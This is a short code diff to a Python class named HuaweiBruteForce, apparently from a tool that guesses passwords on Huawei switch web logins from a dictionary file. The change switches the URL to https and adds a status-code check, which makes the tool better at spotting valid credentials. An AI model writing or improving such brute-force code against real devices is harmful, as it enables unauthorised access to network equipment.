@@ -101,7 +101,7 @@ class HuaweiBruteForce(IBruteForce):
 
     def switch_brute_force(self, device: Device):
         '''针对Huawei-Switch的爆破方法'''
-        base_url = 'http://{}/{}'
+        base_url = 'https://{}/{}'
         with open(self.passwd_dict_mapper[device.format_brand]) as f:
             lines = f.readlines()
         for line in lines:
@@ -124,7 +124,7 @@ class HuaweiBruteForce(IBruteForce):
                     headers=self.header,
                     timeout=5
                 )
-                if not re.search('ErrorMsg', res.text, re.I):
+                if not re.search('ErrorMsg', res.text, re.I) and res.status_code < 400:
                     return f'{username}:{passwd}'
             except requests.ConnectTimeout as te:
                 print(te)
